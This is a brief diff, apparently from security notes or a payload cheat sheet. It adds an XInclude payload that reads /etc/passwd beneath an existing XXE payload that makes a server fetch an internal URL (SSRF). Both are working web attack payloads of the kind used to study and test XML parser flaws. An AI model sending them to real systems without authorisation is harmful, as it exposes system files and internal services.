@@ -8,3 +8,7 @@ Exploiting XXE to perform SSRF attacks:
 
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
 
+
+Exploiting XInclude to retrieve files:
+
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
